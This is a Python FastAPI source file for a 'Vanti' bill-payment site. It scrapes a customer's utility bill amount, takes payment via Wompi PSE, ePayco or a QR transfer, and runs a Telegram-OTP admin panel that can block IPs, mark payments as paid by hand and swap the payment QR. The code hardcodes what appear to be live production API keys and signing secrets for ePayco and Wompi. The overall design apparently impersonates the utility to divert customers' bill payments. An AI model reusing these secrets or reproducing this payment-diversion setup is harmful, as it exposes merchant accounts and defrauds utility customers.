import sys
import asyncio
import os
import random
import shutil
import json
import time
import hashlib
import requests
import httpx
from typing import List

# Credenciales ePayco (Producción)
EPAYCO_PUBLIC_KEY = "24da23d756446dcd468753da3db0aea4"          # Copias el valor de PUBLIC_KEY
EPAYCO_P_CUST_ID_CLIENT = "1594891"    # Copias el valor de P_CUST_ID_CLIENTE
EPAYCO_P_KEY = "e934b987624597d78a2ad09aaf880a8babce2636"                    # Copias el valor de P_KEY
EPAYCO_PRIVATE_KEY = "c40c89c21f5f056e15cf94f3d62d7b41"        # Copias el valor de PRIVATE_KEY (opcional para API backend)

EPAYCO_TEST_MODE = "false"                        # "false" porque estás en Producción

# Credenciales Wompi (Producción)
WOMPI_PUBLIC_KEY = "pub_prod_I2vRHmQCy40mg1ufOy1DG4da07FgbS5J"
WOMPI_PRIVATE_KEY = "prv_prod_lLAzYgRZ1yV0vjExGRP0dBRBSfQS5ohE"
WOMPI_EVENTS_SECRET = "prod_events_K7sDaMgAnc4ykW0rNKBcTumnDbh2NJKh"
WOMPI_INTEGRITY_SECRET = "prod_integrity_sVUtOOGSG3VnAgch4HGizye8bS7OMgiw"
WOMPI_API = "https://production.wompi.co/v1"

# 1. Configurar política de Event Loop para Windows ANTES de iniciar tareas asíncronas
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

from fastapi import FastAPI, Request, Form, WebSocket, WebSocketDisconnect, UploadFile, File, HTTPException, Depends
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from app.database import (
    init_db, guardar_transaccion, actualizar_estado_transaccion,
    obtener_transaccion, obtener_todas_transacciones, obtener_metricas,
    bloquear_ip, es_ip_bloqueada, guardar_otp_admin, verificar_otp_admin
)

from app.vanti_scraper import consultar_factura_vanti
from app.telegram_utils import enviar_mensaje_telegram

# 2. Inicializar la aplicación FastAPI
app = FastAPI(title="Sistema Vanti & Panel Admin")

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
STATIC_DIR = os.path.join(BASE_DIR, "static")

# Inicializar Base de Datos SQLite
init_db()

# Montar archivos estáticos y plantillas
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="app/templates")

# Gestor de conexiones WebSockets para el Panel Admin local
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception:
                pass

manager = ConnectionManager()

# Helper para obtener IP del cliente
def get_client_ip(request: Request) -> str:
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0]
    return request.client.host or "127.0.0.1"

# Middleware para bloqueo de IP
@app.middleware("http")
async def check_ip_blocking(request: Request, call_next):
    ip = get_client_ip(request)
    if es_ip_bloqueada(ip) and not request.url.path.startswith("/static"):
        return HTMLResponse("<h1>403 Acceso Denegado - Su IP ha sido bloqueada.</h1>", status_code=403)
    response = await call_next(request)
    return response

# --- RUTAS PÚBLICAS (CLIENTE) ---

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse(
        request=request, name="index.html", context={"error": None}
    )

@app.get("/pagar-demo", response_class=HTMLResponse)
async def pagar_demo(request: Request, referencia: str = "61743859", monto: float = 100000):
    """Ruta de prueba: crea una transacción y muestra el checkout PSE con Wompi."""
    tx_id = guardar_transaccion("79", referencia, monto, get_client_ip(request))
    bancos = await _obtener_bancos_pse()

    return templates.TemplateResponse(
        request=request, name="checkout.html",
        context={
            "tx_id": tx_id,
            "referencia": referencia,
            "monto": int(monto),
            "empresa": "79",
            "bancos": bancos,
            "error": None
        }
    )

@app.post("/actividad/{tx_id}")
async def actividad(tx_id: int):
    return {"status": "ok"}

@app.post("/consultar", response_class=HTMLResponse)
async def consultar(
    request: Request, 
    empresa: str = Form(...), 
    referencia: str = Form(...),
    metodo_pago: str = Form("pse")
):
    ip = get_client_ip(request)
    
    # Ejecutar Scraper de Vanti
    resultado = await consultar_factura_vanti(empresa, referencia)
    
    if not resultado.get("success"):
        return templates.TemplateResponse(
            request=request, name="index.html",
            context={"error": resultado.get("message", "Error al consultar la referencia.")}
        )
    
    # Guardar en Base de Datos
    monto = float(resultado.get("amount", 0))
    tx_id = guardar_transaccion(empresa, referencia, monto, ip)

    tx = obtener_transaccion(tx_id)
    metricas = obtener_metricas()

    # Notificar al admin por WebSocket
    await manager.broadcast({
        "event": "NUEVA_CONSULTA",
        "tx": tx,
        "metricas": metricas
    })

    # Redirección según método elegido
    if metodo_pago == "llave":
        return templates.TemplateResponse(
            request=request, name="checkout_llave.html",
            context={
                "tx_id": tx_id,
                "referencia": referencia,
                "monto": int(monto),
                "empresa": empresa
            }
        )

    # Flujo por defecto (PSE): checkout directo a PSE con Wompi
    bancos = await _obtener_bancos_pse()
    return templates.TemplateResponse(
        request=request, name="checkout.html",
        context={
            "tx_id": tx_id,
            "referencia": referencia,
            "monto": int(monto),
            "empresa": empresa,
            "bancos": bancos,
            "error": None
        }
    )

# --- WEBHOOK: EVENTOS DE EPAYCO REENVIADOS POR EL PUENTE LOCAL (ngrok) ---

# x_cod_response -> estado local en la BD
EPAYCO_COD_A_ESTADO = {
    "1": "pagado",      # Aceptada
    "2": "no_pagado",   # Rechazada
    "3": "esperando",   # Pendiente
    "4": "no_pagado",   # Fallida
}

def firma_epayco_valida(data: dict) -> bool:
    """Valida la firma x_signature enviada por ePayco (checkout estándar)."""
    cadena = (
        f"{EPAYCO_P_CUST_ID_CLIENT}^{EPAYCO_P_KEY}^{data.get('x_ref_payco', '')}^"
        f"{data.get('x_transaction_id', '')}^{data.get('x_amount', '')}^"
        f"{data.get('x_currency_code', '')}"
    )
    esperada = hashlib.sha256(cadena.encode("utf-8")).hexdigest()
    recibida = str(data.get("x_signature", "")).strip().lower()
    return esperada == recibida

async def _procesar_evento_epayco(datos: dict, origen: str) -> dict:
    """Lógica común: valida la firma, actualiza la transacción y avisa al panel admin."""
    if not isinstance(datos, dict) or not datos:
        raise HTTPException(status_code=400, detail="Evento sin datos")

    # 1. Validar la firma de ePayco
    if not firma_epayco_valida(datos):
        print("⛔ [ePayco] Firma inválida. Evento rechazado.")
        raise HTTPException(status_code=400, detail="Firma inválida")

    # 2. Identificar la transacción: la factura llega como "referencia-tx_id"
    factura = str(datos.get("x_id_invoice") or datos.get("x_extra1") or "")
    try:
        tx_id = int(factura.rsplit("-", 1)[1])
    except (IndexError, ValueError):
        print(f"⚠️ [ePayco] No se pudo extraer tx_id de la factura '{factura}'")
        return {"success": False, "message": "La factura no contiene un tx_id válido", "factura": factura}

    tx = obtener_transaccion(tx_id)
    if not tx:
        print(f"⚠️ [ePayco] Transacción {tx_id} no encontrada en la BD")
        return {"success": False, "message": "Transacción no encontrada", "tx_id": tx_id}

    # 3. Traducir el código de respuesta de ePayco al estado local
    cod = str(datos.get("x_cod_response", "")).strip()
    nuevo_estado = EPAYCO_COD_A_ESTADO.get(cod, "esperando")

    # No degradar una transacción que ya quedó pagada
    if tx["estado"] == "pagado" and nuevo_estado != "pagado":
        print(f"ℹ️ [ePayco] TX {tx_id} ya está 'pagado'; se ignora el estado '{nuevo_estado}'")
    elif nuevo_estado != tx["estado"]:
        actualizar_estado_transaccion(tx_id, nuevo_estado)
        print(
            f"💾 [ePayco] TX {tx_id} -> '{nuevo_estado}' "
            f"(ref_payco: {datos.get('x_ref_payco')}, monto: {datos.get('x_amount')} {datos.get('x_currency_code')})"
        )

    # 4. Notificar al panel admin por WebSocket
    await manager.broadcast({
        "event": "ACTUALIZACION_PAGO",
        "tx": obtener_transaccion(tx_id),
        "metricas": obtener_metricas()
    })

    return {"success": True, "tx_id": tx_id, "estado": nuevo_estado, "origen": origen}

@app.post("/webhook-epayco")
async def recibir_evento_epayco(request: Request):
    """Recibe los eventos de ePayco reenviados por puente_local.py (vía ngrok).

    El puente envía un POST JSON con la forma:
        {"fecha": "...", "origen": "respuesta"|"confirmacion", "datos": {...campos x_... de ePayco...}}
    """
    try:
        payload = await request.json()
    except Exception:
        raise HTTPException(status_code=400, detail="Cuerpo JSON inválido")

    origen = payload.get("origen", "desconocido")
    datos = payload.get("datos") or {}
    print(f"\n🔔 [Webhook ePayco] Evento '{origen}' recibido: {json.dumps(datos, ensure_ascii=False)}")

    return await _procesar_evento_epayco(datos, origen)

@app.api_route("/notificar_pago", methods=["GET", "POST"])
async def notificar_pago(request: Request):
    """URL de confirmación que el checkout envía a ePayco (confirmation en checkout.html).

    ePayco la llama directamente (servidor a servidor) con los campos x_...
    por form-data o querystring.
    """
    datos = dict(request.query_params)
    if request.method == "POST":
        try:
            if "application/json" in request.headers.get("content-type", ""):
                datos.update(await request.json())
            else:
                datos.update(dict(await request.form()))
        except Exception:
            pass
    print(f"\n🔔 [ePayco] Confirmación directa recibida: {json.dumps(datos, ensure_ascii=False)}")

    return await _procesar_evento_epayco(datos, "directo")

# --- RUTAS DEL FRONT: PANTALLA DE ESPERA Y RESULTADO DEL PAGO ---

@app.get("/estado_pago/{tx_id}")
async def estado_pago(tx_id: int):
    """Sondeo JSON usado por la pantalla 'Verificando su Pago...' (esperando.html)."""
    tx = obtener_transaccion(tx_id)
    if not tx:
        raise HTTPException(status_code=404, detail="Transacción no encontrada")
    return {"tx_id": tx_id, "estado": tx["estado"]}

@app.get("/resultado/{tx_id}", response_class=HTMLResponse)
async def resultado_pago(request: Request, tx_id: int, id: str = ""):
    """Página a la que vuelve el cliente tras pagar en el banco (redirect_url de Wompi).

    Si viene ?id=<transacción Wompi>, verifica el estado real contra la API de
    Wompi al instante. Si ya está confirmado -> '¡Pago Exitoso!' (estado.html);
    si aún no -> pantalla de espera (esperando.html) que sondea /estado_pago.
    """
    tx = obtener_transaccion(tx_id)
    if not tx:
        return RedirectResponse(url="/", status_code=303)

    # El cliente regresa del banco: verificar el estado real contra Wompi ya mismo
    if id and tx["estado"] not in ("pagado", "no_pagado"):
        try:
            data = (await _wompi_get(f"/transactions/{id}")).get("data") or {}
            # Seguridad: la referencia de Wompi debe corresponder a esta tx
            if str(data.get("reference", "")).rsplit("-", 1)[-1] == str(tx_id):
                await _aplicar_estado_wompi(tx_id, data, "redireccion")
                tx = obtener_transaccion(tx_id)
        except Exception as e:
            print(f"⚠️ [Wompi] No se pudo verificar la transacción {id}: {e}")

    if tx["estado"] in ("pagado", "no_pagado"):
        return templates.TemplateResponse(
            request=request, name="estado.html", context={"tx": tx}
        )
    return templates.TemplateResponse(
        request=request, name="esperando.html", context={"tx_id": tx_id}
    )

# --- PAGO PSE DIRECTO CON WOMPI ---

async def _wompi_get(path: str) -> dict:
    """GET autenticado con la llave pública a la API de Wompi."""
    async with httpx.AsyncClient(timeout=15) as client:
        r = await client.get(
            f"{WOMPI_API}{path}",
            headers={"Authorization": f"Bearer {WOMPI_PUBLIC_KEY}"}
        )
        return r.json() or {}

async def _obtener_bancos_pse() -> list:
    """Lista de instituciones financieras PSE desde la API de Wompi."""
    try:
        data = await _wompi_get("/pse/financial_institutions")
        return data.get("data") or []
    except Exception as e:
        print(f"⚠️ [Wompi] No se pudo obtener la lista de bancos: {e}")
        return []

def _firma_integridad_wompi(referencia: str, monto_centavos: int) -> str:
    cadena = f"{referencia}{monto_centavos}COP{WOMPI_INTEGRITY_SECRET}"
    return hashlib.sha256(cadena.encode("utf-8")).hexdigest()

def _firma_evento_wompi_valida(evento: dict) -> bool:
    """Valida el checksum de un evento Wompi con el secreto de eventos."""
    try:
        firma = evento["signature"]
        valores = ""
        for prop in firma["properties"]:
            nodo = evento["data"]
            for parte in prop.split("."):
                nodo = nodo[parte]
            valores += str(nodo)
        esperada = hashlib.sha256(
            (valores + str(evento["timestamp"]) + WOMPI_EVENTS_SECRET).encode("utf-8")
        ).hexdigest()
        return esperada == firma["checksum"]
    except Exception:
        return False

WOMPI_STATUS_A_ESTADO = {
    "APPROVED": "pagado",
    "DECLINED": "no_pagado",
    "ERROR": "no_pagado",
    "VOIDED": "no_pagado",
    "PENDING": "por_verificar",
}

async def _aplicar_estado_wompi(tx_id: int, data: dict, origen: str) -> dict:
    """Actualiza la transacción local según el estado VERIFICADO de Wompi
    (data = transacción consultada directamente a la API de Wompi)."""
    tx = obtener_transaccion(tx_id)
    if not tx:
        return {"success": False, "message": "Transacción no encontrada", "tx_id": tx_id}

    # Validar que el monto coincida con la transacción local
    monto_wompi = (data.get("amount_in_cents") or 0) / 100
    if monto_wompi and abs(float(tx["monto"]) - monto_wompi) > 1:
        print(f"⛔ [Wompi] Monto no coincide en TX {tx_id}: local {tx['monto']} vs wompi {monto_wompi}")
        return {"success": False, "message": "El monto no coincide con la transacción local"}

    estado_wompi = str(data.get("status", "")).upper()
    nuevo_estado = WOMPI_STATUS_A_ESTADO.get(estado_wompi, "por_verificar")

    # No degradar una transacción que ya quedó pagada
    if tx["estado"] == "pagado" and nuevo_estado != "pagado":
        print(f"ℹ️ [Wompi] TX {tx_id} ya está 'pagado'; se ignora '{nuevo_estado}'")
        return {"success": True, "tx_id": tx_id, "estado": tx["estado"]}

    if nuevo_estado != tx["estado"]:
        actualizar_estado_transaccion(tx_id, nuevo_estado)
        print(f"💾 [Wompi] ({origen}) TX {tx_id} -> '{nuevo_estado}' (id wompi: {data.get('id')})")
        if nuevo_estado == "pagado":
            enviar_mensaje_telegram(
                f"✅ <b>¡Pago aprobado por Wompi!</b>\n"
                f"• <b>Empresa:</b> {tx['empresa']}\n"
                f"• <b>Referencia:</b> {tx['referencia']}\n"
                f"• <b>Monto:</b> ${tx['monto']:,.0f}\n"
                f"• <b>ID Wompi:</b> <code>{data.get('id')}</code>"
            )
        await manager.broadcast({
            "event": "ACTUALIZACION_PAGO",
            "tx": obtener_transaccion(tx_id),
            "metricas": obtener_metricas()
        })

    return {"success": True, "tx_id": tx_id, "estado": nuevo_estado}

@app.post("/pagar-pse")
async def pagar_pse(
    request: Request,
    tx_id: int = Form(...),
    banco: str = Form(...),
    tipo_persona: int = Form(0),
    tipo_doc: str = Form("CC"),
    documento: str = Form(...),
    nombre: str = Form(...),
    email: str = Form(...),
    telefono: str = Form(...),
):
    """Crea la transacción PSE en Wompi (API) y redirige al cliente a su banco."""
    tx = obtener_transaccion(tx_id)
    if not tx:
        return RedirectResponse(url="/", status_code=303)

    referencia = str(tx["referencia"])
    ref_wompi = f"{referencia}-{tx_id}"
    monto_centavos = int(float(tx["monto"])) * 100
    redirect_url = str(request.base_url).rstrip("/") + f"/resultado/{tx_id}"

    telefono_limpio = telefono.strip().replace(" ", "")
    if not telefono_limpio.startswith("57"):
        telefono_limpio = f"57{telefono_limpio}"

    error = None
    async_url = None
    try:
        async with httpx.AsyncClient(timeout=20) as client:
            # 1. Token de aceptación del comercio
            r = await client.get(f"{WOMPI_API}/merchants/{WOMPI_PUBLIC_KEY}")
            merch = (r.json() or {}).get("data") or {}
            acceptance_token = (merch.get("presigned_acceptance") or {}).get("acceptance_token")
            if not acceptance_token:
                raise ValueError("No se obtuvo el token de aceptación de Wompi.")

            # 2. Crear la transacción PSE
            payload = {
                "amount_in_cents": monto_centavos,
                "currency": "COP",
                "reference": ref_wompi,
                "signature": _firma_integridad_wompi(ref_wompi, monto_centavos),
                "customer_email": email.strip(),
                "acceptance_token": acceptance_token,
                "payment_method": {
                    "type": "PSE",
                    "user_type": tipo_persona,
                    "user_legal_id_type": tipo_doc,
                    "user_legal_id": documento.strip(),
                    "financial_institution_code": banco,
                    "payment_description": f"Factura Vanti ref {referencia}"[:64],
                },
                "customer_data": {
                    "full_name": nombre.strip(),
                    "phone_number": telefono_limpio,
                },
                "redirect_url": redirect_url,
            }
            r = await client.post(
                f"{WOMPI_API}/transactions",
                json=payload,
                headers={"Authorization": f"Bearer {WOMPI_PRIVATE_KEY}"},
            )
            resp = r.json() or {}
            wompi_id = (resp.get("data") or {}).get("id")
            if r.status_code not in (200, 201) or not wompi_id:
                detalle = (resp.get("error") or {}).get("reason") or str(resp)[:300]
                raise ValueError(f"Wompi rechazó la transacción: {detalle}")

            print(f"💳 [Wompi PSE] Transacción creada {wompi_id} para TX {tx_id} (${tx['monto']:,.0f})")

            # 3. Esperar la URL del banco (async_payment_url) con sondeo corto
            for _ in range(12):
                r = await client.get(
                    f"{WOMPI_API}/transactions/{wompi_id}",
                    headers={"Authorization": f"Bearer {WOMPI_PUBLIC_KEY}"},
                )
                t = (r.json() or {}).get("data") or {}
                async_url = ((t.get("payment_method") or {}).get("extra") or {}).get("async_payment_url")
                if async_url:
                    break
                await asyncio.sleep(1)

    except Exception as e:
        error = str(e)
        print(f"⛔ [Wompi PSE] {error}")

    if async_url:
        return RedirectResponse(url=async_url, status_code=303)

    bancos = await _obtener_bancos_pse()
    return templates.TemplateResponse(
        request=request, name="checkout.html",
        context={
            "tx_id": tx_id,
            "referencia": referencia,
            "monto": int(float(tx["monto"])),
            "empresa": tx["empresa"],
            "bancos": bancos,
            "error": error or "No se pudo conectar con tu banco. Intenta de nuevo.",
        },
        status_code=502,
    )

@app.post("/webhook-wompi")
async def webhook_wompi(request: Request):
    """Recibe los eventos de Wompi (transaction.updated).

    Valida el checksum del evento con el secreto de eventos y, como doble
    verificación, consulta la transacción directamente a la API de Wompi.
    Configura esta URL en el dashboard de Wompi -> Eventos.
    """
    try:
        evento = await request.json()
    except Exception:
        raise HTTPException(status_code=400, detail="Cuerpo JSON inválido")

    tx_wompi_id = ((evento.get("data") or {}).get("transaction") or {}).get("id")
    print(f"\n🔔 [Wompi] Evento recibido: {evento.get('event')} | tx: {tx_wompi_id}")

    if not _firma_evento_wompi_valida(evento):
        print("⛔ [Wompi] Firma de evento inválida. Se rechaza.")
        raise HTTPException(status_code=400, detail="Firma de evento inválida")

    if not tx_wompi_id:
        return {"success": False, "message": "Evento sin transaction.id"}

    try:
        data = (await _wompi_get(f"/transactions/{tx_wompi_id}")).get("data") or {}
    except Exception as e:
        print(f"⚠️ [Wompi] No se pudo verificar la transacción {tx_wompi_id}: {e}")
        return {"success": False, "message": "No se pudo verificar con Wompi"}

    referencia_wompi = str(data.get("reference", ""))
    try:
        tx_id = int(referencia_wompi.rsplit("-", 1)[1])
    except (IndexError, ValueError):
        print(f"⚠️ [Wompi] La referencia '{referencia_wompi}' no contiene un tx_id válido")
        return {"success": False, "message": "Referencia sin tx_id", "reference": referencia_wompi}

    return await _aplicar_estado_wompi(tx_id, data, "webhook")

# --- PANEL ADMIN (acceso con OTP enviado a Telegram) ---

ADMIN_SESSIONS = set()  # Tokens de sesión activos (en memoria)
ADMIN_ESTADOS_VALIDOS = {"esperando", "por_verificar", "pagado", "no_pagado"}

def es_admin_autenticado(request: Request) -> bool:
    return request.cookies.get("admin_session") in ADMIN_SESSIONS

@app.get("/admin", response_class=HTMLResponse)
async def admin_panel(request: Request):
    # Sin sesión: generar OTP, enviarlo por Telegram y mostrar el login
    if not es_admin_autenticado(request):
        otp = f"{random.randint(0, 999999):06d}"
        guardar_otp_admin(otp)
        enviar_mensaje_telegram(f"🔐 Código de acceso al panel admin: <b>{otp}</b>")
        return templates.TemplateResponse(
            request=request, name="admin_login.html", context={"error": None}
        )

    return templates.TemplateResponse(
        request=request, name="admin.html",
        context={
            "transacciones": obtener_todas_transacciones(),
            "metricas": obtener_metricas()
        }
    )

@app.post("/admin/login")
async def admin_login(request: Request, otp: str = Form(...)):
    otp = otp.strip()
    if otp and verificar_otp_admin(otp):
        # Invalidar el OTP para que no pueda reutilizarse
        guardar_otp_admin("")
        token = hashlib.sha256(f"{otp}-{time.time()}-{random.random()}".encode()).hexdigest()
        ADMIN_SESSIONS.add(token)
        respuesta = RedirectResponse(url="/admin", status_code=303)
        respuesta.set_cookie("admin_session", token, httponly=True, max_age=60 * 60 * 8)
        return respuesta

    return templates.TemplateResponse(
        request=request, name="admin_login.html",
        context={"error": "Código incorrecto o expirado."}
    )

@app.get("/admin/datos")
async def admin_datos(request: Request):
    """JSON que sondea admin.html cada 5s para actualizar la tabla y las métricas."""
    if not es_admin_autenticado(request):
        raise HTTPException(status_code=401, detail="No autorizado")
    return {
        "transacciones": obtener_todas_transacciones(),
        "metricas": obtener_metricas()
    }

@app.post("/admin/cambiar_estado")
async def admin_cambiar_estado(request: Request, tx_id: int = Form(...), nuevo_estado: str = Form(...)):
    if not es_admin_autenticado(request):
        raise HTTPException(status_code=401, detail="No autorizado")
    if nuevo_estado not in ADMIN_ESTADOS_VALIDOS:
        raise HTTPException(status_code=400, detail="Estado no válido")

    actualizar_estado_transaccion(tx_id, nuevo_estado)
    await manager.broadcast({
        "event": "ACTUALIZACION_PAGO",
        "tx": obtener_transaccion(tx_id),
        "metricas": obtener_metricas()
    })
    return {"success": True, "tx_id": tx_id, "estado": nuevo_estado}

@app.post("/admin/bloquear_ip")
async def admin_bloquear_ip(request: Request, ip: str = Form(...)):
    if not es_admin_autenticado(request):
        raise HTTPException(status_code=401, detail="No autorizado")
    bloquear_ip(ip.strip())
    return {"success": True, "ip": ip}

@app.post("/admin/actualizar_qr")
async def admin_actualizar_qr(request: Request, file: UploadFile = File(...)):
    if not es_admin_autenticado(request):
        raise HTTPException(status_code=401, detail="No autorizado")

    ext = os.path.splitext(file.filename or "")[1].lower()
    if ext not in (".jpg", ".jpeg", ".png", ".webp"):
        ext = ".jpg"

    uploads_dir = os.path.join(STATIC_DIR, "uploads")
    os.makedirs(uploads_dir, exist_ok=True)

    # Eliminar versiones anteriores del QR y guardar la nueva
    for nombre in os.listdir(uploads_dir):
        if nombre.startswith("qr_actual."):
            os.remove(os.path.join(uploads_dir, nombre))
    with open(os.path.join(uploads_dir, f"qr_actual{ext}"), "wb") as f:
        shutil.copyfileobj(file.file, f)

    return RedirectResponse(url="/admin", status_code=303)